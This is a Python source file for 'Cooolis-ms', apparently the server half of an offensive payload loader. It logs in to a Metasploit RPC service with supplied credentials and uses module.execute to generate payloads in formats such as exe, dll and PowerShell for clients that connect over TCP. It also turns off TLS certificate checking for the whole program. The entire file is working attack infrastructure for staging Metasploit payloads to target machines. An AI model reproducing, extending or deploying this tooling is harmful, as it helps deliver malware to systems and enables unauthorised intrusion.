"""
Cooolis-ms
------------------------------------------------
Author:Rvn0xsy@gmail.com
Trans Data Format:
+----------+------------------------------------+
|          |                                    |
|    Size  |             Data                   |
|          |                                    |
|          |                                    |
+----------+------------------------------------+
"""


import requests
from argparse import ArgumentParser
import msgpack
import ssl
import sys
import json
from socketserver import BaseRequestHandler,ThreadingTCPServer

ssl._create_default_https_context = ssl._create_unverified_context


class Metasploit_RPC(BaseRequestHandler):
    def __init__(self, request, client_address, server, args):
        self.type = args.type
        self.username = args.username
        self.password = args.password
        self.listen = args.listen
        self.host = args.host
        self.port = args.port
        self.uri = args.uri
        self.debug = args.versobe
        self.token = ''
        self.url = ''
        self.headers = {"Content-type" : "binary/message-pack"}
        if args.ssl:
            prefix = 'https://'
        else:
            prefix = 'http://'
        self.url = "{prefix}{host}:{port}{uri}".format(prefix=prefix,host=self.host,port=self.port,uri=self.uri)
        super().__init__(request, client_address, server)

    @classmethod
    def Creator(cls, *args, **kwargs):
        def _HandlerCreator(request, client_address, server):
            cls(request, client_address, server, *args, **kwargs)
        return _HandlerCreator

    def _request(self,options):
        try:
            if self.debug:
                print(self.url)
            req  = requests.post(self.url,verify=False,headers=self.headers,data=options)
            result = self.__unpack(req.content)
            if b'error' in result:
                print("Error : %s" % str(result[b'error_message']),encoding = "utf8")
            else:
                return result
        except Exception as e:
            sys.stderr.write(str(e)+"\nRef:https://metasploit.help.rapid7.com/docs/standard-api-methods-referenc\n")

    def _get_token(self):
        if self.debug:
            print(self.url,self.username,self.password)
        options = ["auth.login",self.username,self.password]
        options = self.__pack(options)
        result = self._request(options)
        self.token = str(result[b'token'],encoding = "utf8")

    def __pack(self,pack_str):
        return msgpack.packb(pack_str)

    def __unpack(self,pack_str):
        return msgpack.unpackb(pack_str)

    def __send_payload(self,options):
        pack_data = ["module.execute",self.token,"payload",options['payload'],options]
        return self._request(pack_data)

    def handle(self):
        print('New connection:',self.client_address)
        self._get_token()
        if self.debug:
            print("Token : {token}".format(token=self.token))
        while True:
            data = self.request.recv(1024)
            data = data.decode()
            data = json.loads(data)
            if not data:break
            print('Client data:',data)
            print(self.__send_payload(data))
            # self.request.send(payload.encode())

def main():
    example = 'Example:\n\n$ python3 server.py -U msf -P msf'
    args = ArgumentParser(prog='Cooolis-ms',epilog=example)
    args.add_argument('-U','--username',help='Metasploit web service username',required=True)
    args.add_argument('-P','--password',help='Metasploit web service password',required=True)
    args.add_argument('-H','--host',help='Metasploit web service host',default='localhost')
    args.add_argument('-p','--port',help='Metasploit RPC service port',default=55553)
    args.add_argument('-l','--listen',help='Payload listen port',default=8080)
    args.add_argument('-u','--uri',help='Metasploit RPC service uri',default='/api/1.0/')
    args.add_argument('-t','--type',help='Payload Type',choices=('exe','ruby','c','dll','vbs','powershell'))
    args.add_argument('-s','--ssl',help='Enable ssl',action="store_true")
    args.add_argument('-v','--versobe',help='Enable debug',action="store_true")
    parser = args.parse_args()
    server = ThreadingTCPServer(("localhost",parser.listen),Metasploit_RPC.Creator(parser))
    server.serve_forever()
    
if __name__ == "__main__":
    main()
    